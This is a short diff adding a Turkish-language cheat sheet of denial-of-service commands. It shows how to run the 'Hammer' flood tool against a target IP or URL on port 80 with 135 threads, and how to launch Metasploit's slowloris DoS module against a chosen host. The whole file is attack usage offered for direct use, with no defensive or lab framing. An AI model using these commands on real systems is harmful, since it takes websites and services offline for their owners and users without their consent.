@@ -1,0 +1,9 @@
+Hammer:
+    Hammer aracını indirip kuruyoruz.
+    ->python3 hammer.py -s <ip/url> -p 80 -t 135
+    
+Metasploit:
+    ->msfconsole
+    ->use auxiliary/dos/http/slowloris
+    ->set rhost <ip/url>
+    ->run
